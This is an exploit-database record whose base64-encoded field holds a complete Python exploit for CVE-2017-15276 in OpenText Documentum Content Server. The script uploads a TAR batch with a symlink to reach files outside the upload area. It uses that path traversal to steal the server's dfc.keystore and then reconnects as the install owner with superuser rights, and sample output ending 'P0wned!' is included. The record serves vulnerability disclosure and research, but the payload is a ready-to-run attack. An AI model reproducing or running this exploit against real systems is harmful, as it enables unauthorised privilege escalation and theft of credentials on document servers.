{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCiMgT3BlbnRleHQgRG9jdW1lbnR1bSBDb250ZW50IFNlcnZlciAoZm9ybWVybHkga25vd24gYXMgRU1DIERvY3VtZW50dW0gQ29udGVudCBTZXJ2ZXIpDQojIGNvbnRhaW5zIGZvbGxvd2luZyBkZXNpZ24gZ2FwLCB3aGljaCBhbGxvd3MgYXV0aGVudGljYXRlZCB1c2VyIHRvIGdhaW4gcHJpdmlsZWdlcw0KIyBvZiBzdXBlcnVzZXI6DQojDQojIENvbnRlbnQgU2VydmVyIGFsbG93cyB0byB1cGxvYWQgY29udGVudCB1c2luZyBiYXRjaGVzIChUQVIgYXJjaGl2ZXMpLCB3aGVuIHVucGFja2luZw0KIyBUQVIgYXJjaGl2ZXMgQ29udGVudCBTZXJ2ZXIgZmFpbHMgdG8gdmVyaWZ5IGNvbnRlbnRzIG9mIFRBUiBhcmNoaXZlIHdoaWNoDQojIGNhdXNlcyBwYXRoIHRyYXZlcnNhbCB2dWxuZXJhYmlsaXR5IHZpYSBzeW1saW5rcywgYmVjYXVzZSBzb21lIGZpbGVzIG9uIENvbnRlbnQgU2VydmVyDQojIGZpbGVzeXN0ZW0gYXJlIHNlY3VyaXR5LXNlbnNpdGl2ZSB0aGUgc2VjdXJpdHkgZmxhdyBkZXNjcmliZWQgYWJvdmUgbGVhZHMgdG8NCiMgcHJpdmlsZWdlIGVzY2FsYXRpb24NCiMNCiMgVGhlIFBvQyBiZWxvdyBkZW1vbnN0cmF0ZXMgdGhpcyB2dWxuZXJhYmlsaXR5Og0KIw0KIyBNYWNCb29rLVBybzp+ICQgcHl0aG9uIENWRS0yMDE3LTE1Mjc2LnB5DQojIHVzYWdlOg0KIyBPVERvY3VtZW50dW1UYXJWdWxuZXJhYmlsaXR5LnB5IGhvc3QgcG9ydCB1c2VyIHBhc3N3b3JkDQojIE1hY0Jvb2stUHJvOn4gJCBweXRob24gQ1ZFLTIwMTctMTUyNzYucHkgZG9jdTcyZGV2MDEgMTAwMDEgZG1fYm9mX3JlZ2lzdHJ5IGRtX2JvZl9yZWdpc3RyeQ0KIyBUcnlpbmcgdG8gY29ubmVjdCB0byBkb2N1NzJkZXYwMToxMDAwMSBhcyBkbV9ib2ZfcmVnaXN0cnkgLi4uDQojIENvbm5lY3RlZCB0byBkb2N1NzJkZXYwMToxMDAwMSwgZG9jYmFzZTogRENUTV9ERVYsIHZlcnNpb246IDcuMi4wMjcwLjAzNzcgIExpbnV4NjQuT3JhY2xlDQojIERvd25sb2FkaW5nIC91MDEvZG9jdW1lbnR1bS9jcy9wcm9kdWN0LzcuMi9iaW4vZG1fc2V0X3NlcnZlcl9lbnYuc2gNCiMgQ3JlYXRpbmcgbWFsaWNpb3VzIGRtcl9jb250ZW50IG9iamVjdA0KIyBUcnlpbmcgdG8gZmluZCBhbnkgb2JqZWN0IHdpdGggY29udGVudC4uLg0KIyAgICAgRG93bmxvYWRpbmcgL3UwMS9kb2N1bWVudHVtL2NzL3NoYXJlZC9jb25maWcvZGZjLmtleXN0b3JlDQojIENyZWF0aW5nIG1hbGljaW91cyBkbXJfY29udGVudCBvYmplY3QNCiMgVHJ5aW5nIHRvIGZpbmQgYW55IG9iamVjdCB3aXRoIGNvbnRlbnQuLi4NCiMgICAgIFRyeWluZyB0byBjb25uZWN0IHRvIGRvY3U3MmRldjAxOjEwMDAxIGFzIGRtYWRtaW4gLi4uDQojIENvbm5lY3RlZCB0byBkb2N1NzJkZXYwMToxMDAwMSwgZG9jYmFzZTogRENUTV9ERVYsIHZlcnNpb246IDcuMi4wMjcwLjAzNzcgIExpbnV4NjQuT3JhY2xlDQojIFAwd25lZCENCg0KDQppbXBvcnQgaW8NCmltcG9ydCBzb2NrZXQNCmltcG9ydCBzeXMNCmltcG9ydCB0YXJmaWxlDQoNCmZyb20gZGN0bXB5IGltcG9ydCBOVUxMX0lEDQoNCmZyb20gZGN0bXB5LmRvY2Jhc2VjbGllbnQgaW1wb3J0IERvY2Jhc2VDbGllbnQNCmZyb20gZGN0bXB5LmlkZW50aXR5IGltcG9ydCBJZGVudGl0eQ0KZnJvbSBkY3RtcHkub2JqLnR5cGVkb2JqZWN0IGltcG9ydCBUeXBlZE9iamVjdA0KDQpDSVBIRVJTID0gIkFMTDphTlVMTDohZU5VTEwiDQoNCg0KZGVmIHVzYWdlKCk6DQogICAgcHJpbnQgInVzYWdlOlxuJXMgaG9zdCBwb3J0IHVzZXIgcGFzc3dvcmQiICUgc3lzLmFyZ3ZbMF0NCg0KDQpkZWYgbWFpbigpOg0KICAgIGlmIGxlbihzeXMuYXJndikgIT0gNToNCiAgICAgICAgdXNhZ2UoKQ0KICAgICAgICBleGl0KDEpDQoNCiAgICAoc2Vzc2lvbiwgZG9jYmFzZSkgPSBjcmVhdGVfc2Vzc2lvbigqc3lzLmFyZ3ZbMTo1XSkNCg0KICAgIGlmIGlzX3N1cGVyX3VzZXIoc2Vzc2lvbik6DQogICAgICAgIHByaW50ICJDdXJyZW50IHVzZXIgaXMgYSBzdXBlcnVzZXIsIG5vdGhpbmcgdG8gZG8iDQogICAgICAgIGV4aXQoMSkNCg0KICAgIGFkbWluX2NvbnNvbGUgPSBzZXNzaW9uLmdldF9ieV9xdWFsaWZpY2F0aW9uKA0KICAgICAgICAiZG1fbWV0aG9kIHdoZXJlIG9iamVjdF9uYW1lPSdkbV9KTVNBZG1pbkNvbnNvbGUnIikNCiAgICBlbnZfc2NyaXB0ID0gYWRtaW5fY29uc29sZVsnbWV0aG9kX3ZlcmInXQ0KICAgIGVudl9zY3JpcHQgPSBlbnZfc2NyaXB0LnJlcGxhY2UoJ2RtX2ptc19hZG1pbi5zaCcsICdkbV9zZXRfc2VydmVyX2Vudi5zaCcpDQoNCiAgICBrZXlzdG9yZV9wYXRoID0gTm9uZQ0KICAgIHNjcmlwdCA9IHN0cihkb3dubG9hZChzZXNzaW9uLCBlbnZfc2NyaXB0LCBieXRlYXJyYXkoKSkpDQogICAgaWYgbm90IHNjcmlwdDoNCiAgICAgICAgcHJpbnQgIlVuYWJsZSB0byBkb3dubG9hZCBkbV9zZXRfc2VydmVyX2Vudi5zaCINCiAgICAgICAgZXhpdCgxKQ0KDQogICAgZm9yIGwgaW4gc2NyaXB0LnNwbGl0bGluZXMoKToNCiAgICAgICAgaWYgbm90IGwuc3RhcnRzd2l0aCgiRE9DVU1FTlRVTV9TSEFSRUQiKToNCiAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgIGtleXN0b3JlX3BhdGggPSBsLnNwbGl0KCc9JylbMV0NCiAgICAgICAgYnJlYWsNCg0KICAgIGlmIG5vdCBrZXlzdG9yZV9wYXRoOg0KICAgICAgICBwcmludCAiVW5hYmxlIHRvIGRldGVybWluZSBET0NVTUVOVFVNX1NIQVJFRCINCiAgICAgICAgZXhpdCgxKQ0KDQogICAga2V5c3RvcmVfcGF0aCArPSAiL2NvbmZpZy9kZmMua2V5c3RvcmUiDQogICAga2V5c3RvcmUgPSBzdHIoZG93bmxvYWQoc2Vzc2lvbiwga2V5c3RvcmVfcGF0aCwgYnl0ZWFycmF5KCkpKQ0KDQogICAgaWYgbm90IGtleXN0b3JlOg0KICAgICAgICBwcmludCAiVW5hYmxlIHRvIGRvd25sb2FkIGRmYy5rZXlzdG9yZSINCiAgICAgICAgZXhpdCgxKQ0KDQogICAgKHNlc3Npb24sIGRvY2Jhc2UpID0gY3JlYXRlX3Nlc3Npb24oDQogICAgICAgIHN5cy5hcmd2WzFdLCBzeXMuYXJndlsyXSwNCiAgICAgICAgc2Vzc2lvbi5zZXJ2ZXJjb25maWdbJ3JfaW5zdGFsbF9vd25lciddLCAiIiwNCiAgICAgICAgaWRlbnRpdHk9SWRlbnRpdHkodHJ1c3RlZD1UcnVlLCBrZXlzdG9yZT1rZXlzdG9yZSkpDQogICAgaWYgaXNfc3VwZXJfdXNlcihzZXNzaW9uKToNCiAgICAgICAgcHJpbnQgIlAwd25lZCEiDQoNCg0KZGVmIGRvd25sb2FkKHNlc3Npb24sIHBhdGgsIGJ1Zik6DQogICAgcHJpbnQgIkRvd25sb2FkaW5nICVzIiAlIHBhdGgNCg0KICAgIHN0b3JlID0gc2Vzc2lvbi5nZXRfYnlfcXVhbGlmaWNhdGlvbigiZG1fc3RvcmUiKQ0KICAgIGZvcm1hdCA9IHNlc3Npb24uZ2V0X2J5X3F1YWxpZmljYXRpb24oImRtX2Zvcm1hdCB3aGVyZSBuYW1lPSdjcnRleHQnIikNCg0KICAgIHByaW50ICJDcmVhdGluZyBtYWxpY2lvdXMgZG1yX2NvbnRlbnQgb2JqZWN0Ig0KDQogICAgc2Vzc2lvbi5hcHBseShOb25lLCBOVUxMX0lELCAiQkVHSU5fVFJBTlMiKQ0KDQogICAgaGFuZGxlID0gc2Vzc2lvbi5tYWtlX3B1c2hlcihzdG9yZVsncl9vYmplY3RfaWQnXSkNCiAgICBpZiBoYW5kbGUgPCAxOg0KICAgICAgICBwcmludCAiVW5hYmxlIHRvIGNyZWF0ZSBwdXNoZXIiDQogICAgICAgIGVuZF90cmFuKHNlc3Npb24sIEZhbHNlKQ0KICAgICAgICBleGl0KDEpDQoNCiAgICAoYnl0ZXMsIGxlbmd0aCkgPSBjcmVhdGVfdGFyKCJ0ZXN0IiwgcGF0aCkNCiAgICBiID0gYnl0ZWFycmF5KCkNCiAgICBiLmV4dGVuZChieXRlcy5yZWFkKCkpDQoNCiAgICBwcmludCAiVHJ5aW5nIHRvIGZpbmQgYW55IG9iamVjdCB3aXRoIGNvbnRlbnQuLi4iDQogICAgb2JqZWN0X2lkID0gc2Vzc2lvbi5xdWVyeSgNCiAgICAgICAgIlNFTEVDVCBGT1IgUkVBRCByX29iamVjdF9pZCAiDQogICAgICAgICJGUk9NIGRtX3N5c29iamVjdCBXSEVSRSByX2NvbnRlbnRfc2l6ZT4wIikgXA0KICAgICAgICAubmV4dF9yZWNvcmQoKVsncl9vYmplY3RfaWQnXQ0KDQogICAgY29udGVudF9pZCA9IHNlc3Npb24ubmV4dF9pZCgweDA2KQ0KDQogICAgaWYgbm90IHNlc3Npb24uc3RhcnRfcHVzaChoYW5kbGUsIGNvbnRlbnRfaWQsIGZvcm1hdFsncl9vYmplY3RfaWQnXSwgbGVuKGIpKToNCiAgICAgICAgcHJpbnQgIkZhaWxlZCB0byBzdGFydCBwdXNoIg0KICAgICAgICBlbmRfdHJhbihzZXNzaW9uLCBGYWxzZSkNCiAgICAgICAgZXhpdCgxKQ0KDQogICAgc2Vzc2lvbi51cGxvYWQoaGFuZGxlLCBiKQ0KICAgIGRhdGFfdGlja2V0ID0gc2Vzc2lvbi5lbmRfcHVzaF92MihoYW5kbGUpWydEQVRBX1RJQ0tFVCddDQoNCiAgICBjb250ZW50ID0gVHlwZWRPYmplY3Qoc2Vzc2lvbj1zZXNzaW9uKQ0KICAgIGNvbnRlbnQuc2V0X3N0cmluZygiT0JKRUNUX1RZUEUiLCAiZG1yX2NvbnRlbnQiKQ0KICAgIGNvbnRlbnQuc2V0X2Jvb2woIklTX05FV19PQkpFQ1QiLCBUcnVlKQ0KICAgIGNvbnRlbnQuc2V0X2lkKCJzdG9yYWdlX2lkIiwgc3RvcmVbJ3Jfb2JqZWN0X2lkJ10pDQogICAgY29udGVudC5zZXRfaWQoImZvcm1hdCIsIGZvcm1hdFsncl9vYmplY3RfaWQnXSkNCiAgICBjb250ZW50LnNldF9pbnQoImRhdGFfdGlja2V0IiwgZGF0YV90aWNrZXQpDQogICAgY29udGVudC5zZXRfaW50KCJwYWdlIiwgMCkNCiAgICBjb250ZW50LnNldF9zdHJpbmcoInBhZ2VfbW9kaWZpZXIiLCAiZG1fYmF0Y2giKQ0KICAgIGNvbnRlbnQuc2V0X3N0cmluZygiZnVsbF9mb3JtYXQiLCBmb3JtYXRbJ25hbWUnXSkNCiAgICBjb250ZW50LnNldF9pbnQoImNvbnRlbnRfc2l6ZSIsIGxlbihiKSkNCiAgICBjb250ZW50LnNldF9ib29sKCJCQVRDSF9GTEFHIiwgVHJ1ZSkNCiAgICBjb250ZW50LnNldF9ib29sKCJJU19BRERSRU5ESVRJT04iLCBUcnVlKQ0KICAgIGNvbnRlbnQuc2V0X2lkKCJwYXJlbnRfaWQiLCBvYmplY3RfaWQpDQogICAgaWYgbm90IHNlc3Npb24uc2F2ZV9jb250X2F0dHJzKGNvbnRlbnRfaWQsIGNvbnRlbnQpOg0KICAgICAgICBwcmludCAiRmFpbGVkIHRvIGNyZWF0ZSBjb250ZW50Ig0KICAgICAgICBlbmRfdHJhbihzZXNzaW9uLCBGYWxzZSkNCiAgICAgICAgZXhpdCgxKQ0KDQogICAgY29udGVudCA9IHNlc3Npb24uZ2V0X2J5X3F1YWxpZmljYXRpb24oDQogICAgICAgICJkbXJfY29udGVudCBXSEVSRSBhbnkgKHBhcmVudF9pZD0nJXMnICINCiAgICAgICAgIkFORCBwYWdlX21vZGlmaWVyPSclcycpIiAlIChvYmplY3RfaWQsICJ2dWxuIikpDQoNCiAgICBoYW5kbGUgPSBzZXNzaW9uLm1ha2VfcHVsbGVyKA0KICAgICAgICBOVUxMX0lELCBzdG9yZS5vYmplY3RfaWQoKSwgY29udGVudFsncl9vYmplY3RfaWQnXSwNCiAgICAgICAgZm9ybWF0Lm9iamVjdF9pZCgpLCBkYXRhX3RpY2tldA0KICAgICkNCg0KICAgIGlmIGhhbmRsZSA9PSAwOg0KICAgICAgICBlbmRfdHJhbihzZXNzaW9uLCBGYWxzZSkNCiAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCJVbmFibGUgbWFrZSBwdWxsZXIiKQ0KDQogICAgZm9yIGNodW5rIGluIHNlc3Npb24uZG93bmxvYWQoaGFuZGxlKToNCiAgICAgICAgYnVmLmV4dGVuZChjaHVuaykNCg0KICAgIGVuZF90cmFuKHNlc3Npb24sIEZhbHNlKQ0KICAgIHJldHVybiBidWYNCg0KDQpkZWYgY3JlYXRlX3RhcihsaW5rbmFtZSwgbGlua3BhdGgpOg0KICAgIGJ5dGVzID0gaW8uQnl0ZXNJTygpDQogICAgdGFyID0gdGFyZmlsZS5UYXJGaWxlKGZpbGVvYmo9Ynl0ZXMsIG1vZGU9InciLCBmb3JtYXQ9dGFyZmlsZS5HTlVfRk9STUFUKQ0KICAgIGFkZF9saW5rKHRhciwgbGlua25hbWUsIGxpbmtwYXRoKQ0KICAgIHRleHQgPSBpby5CeXRlc0lPKCkNCiAgICB0ZXh0LndyaXRlKCJmaWxlX25hbWU9JyVzJ1xuIiAlIGxpbmtuYW1lKQ0KICAgIHRleHQud3JpdGUoInBhZ2VfbW9kaWZpZXI9J3Z1bG4nXG4iKQ0KICAgIHRleHQud3JpdGUoInBhcmFtZXRlcnM9JydcbiIpDQogICAgdGFyaW5mbyA9IHRhcmZpbGUuVGFySW5mbygicHJvcGVydHkudHh0IikNCiAgICB0YXJpbmZvLnNpemUgPSB0ZXh0LnRlbGwoKQ0KICAgIHRleHQuc2VlaygwKQ0KICAgIHRhci5hZGRmaWxlKHRhcmluZm8sIHRleHQpDQogICAgdGFyLmNsb3NlKCkNCiAgICBsZW5ndGggPSBieXRlcy50ZWxsKCkNCiAgICBieXRlcy5zZWVrKDApDQogICAgcmV0dXJuIChieXRlcywgbGVuZ3RoKQ0KDQoNCmRlZiBhZGRfbGluayh0YXIsIGxpbmtuYW1lLCBsaW5rcGF0aCk6DQogICAgdGFyaW5mbyA9IHRhcmZpbGUuVGFySW5mbyhsaW5rbmFtZSkNCiAgICB0YXJpbmZvLnR5cGUgPSB0YXJmaWxlLlNZTVRZUEUNCiAgICB0YXJpbmZvLmxpbmtwYXRoID0gbGlua3BhdGgNCiAgICB0YXJpbmZvLm5hbWUgPSBsaW5rbmFtZQ0KICAgIHRhci5hZGRmaWxlKHRhcmluZm89dGFyaW5mbykNCg0KDQpkZWYgY3JlYXRlX3Nlc3Npb24oaG9zdCwgcG9ydCwgdXNlciwgcHdkLCBpZGVudGl0eT1Ob25lKToNCiAgICBwcmludCAiVHJ5aW5nIHRvIGNvbm5lY3QgdG8gJXM6JXMgYXMgJXMgLi4uIiAlIFwNCiAgICAgICAgICAoaG9zdCwgcG9ydCwgdXNlcikNCiAgICBzZXNzaW9uID0gTm9uZQ0KICAgIHRyeToNCiAgICAgICAgc2Vzc2lvbiA9IERvY2Jhc2VDbGllbnQoDQogICAgICAgICAgICBob3N0PWhvc3QsIHBvcnQ9aW50KHBvcnQpLA0KICAgICAgICAgICAgdXNlcm5hbWU9dXNlciwgcGFzc3dvcmQ9cHdkLA0KICAgICAgICAgICAgaWRlbnRpdHk9aWRlbnRpdHkpDQogICAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICAgICAgaWYgZS5lcnJubyA9PSA1NDoNCiAgICAgICAgICAgIHNlc3Npb24gPSBEb2NiYXNlQ2xpZW50KA0KICAgICAgICAgICAgICAgIGhvc3Q9aG9zdCwgcG9ydD1pbnQocG9ydCksDQogICAgICAgICAgICAgICAgdXNlcm5hbWU9dXNlciwgcGFzc3dvcmQ9cHdkLA0KICAgICAgICAgICAgICAgIGlkZW50aXR5PWlkZW50aXR5LA0KICAgICAgICAgICAgICAgIHNlY3VyZT1UcnVlLCBjaXBoZXJzPUNJUEhFUlMpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICByYWlzZSBlDQogICAgZG9jYmFzZSA9IHNlc3Npb24uZG9jYmFzZWNvbmZpZ1snb2JqZWN0X25hbWUnXQ0KICAgIHZlcnNpb24gPSBzZXNzaW9uLnNlcnZlcmNvbmZpZ1sncl9zZXJ2ZXJfdmVyc2lvbiddDQogICAgcHJpbnQgIkNvbm5lY3RlZCB0byAlczolcywgZG9jYmFzZTogJXMsIHZlcnNpb246ICVzIiAlIFwNCiAgICAgICAgICAoaG9zdCwgcG9ydCwgZG9jYmFzZSwgdmVyc2lvbikNCiAgICByZXR1cm4gKHNlc3Npb24sIGRvY2Jhc2UpDQoNCg0KZGVmIGlzX3N1cGVyX3VzZXIoc2Vzc2lvbik6DQogICAgdXNlciA9IHNlc3Npb24uZ2V0X2J5X3F1YWxpZmljYXRpb24oImRtX3VzZXIgV0hFUkUgdXNlcl9uYW1lPVVTRVIiKQ0KICAgIGlmIHVzZXJbJ3VzZXJfcHJpdmlsZWdlcyddID09IDE2Og0KICAgICAgICByZXR1cm4gVHJ1ZQ0KICAgIGdyb3VwID0gc2Vzc2lvbi5nZXRfYnlfcXVhbGlmaWNhdGlvbigNCiAgICAgICAgImRtX2dyb3VwIHdoZXJlIGdyb3VwX25hbWU9J2RtX3N1cGVydXNlcnMnICINCiAgICAgICAgIkFORCBhbnkgaV9hbGxfdXNlcnNfbmFtZXM9VVNFUiIpDQogICAgaWYgZ3JvdXAgaXMgbm90IE5vbmU6DQogICAgICAgIHJldHVybiBUcnVlDQoNCiAgICByZXR1cm4gRmFsc2UNCg0KDQpkZWYgZW5kX3RyYW4oc2Vzc2lvbiwgY29tbWl0PUZhbHNlKToNCiAgICBvYmogPSBUeXBlZE9iamVjdChzZXNzaW9uPXNlc3Npb24pDQogICAgb2JqLnNldF9ib29sKCJDT01NSVQiLCBjb21taXQpDQogICAgc2Vzc2lvbi5hcHBseShOb25lLCBOVUxMX0lELCAiRU5EX1RSQU5TIiwgb2JqKQ0KDQoNCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQogICAgbWFpbigpDQo=", 
    "filename": "platforms/multiple/webapps/43002.py", 
    "id": "43002", 
    "cves": [
        "CVE-2017-15276"
    ]
}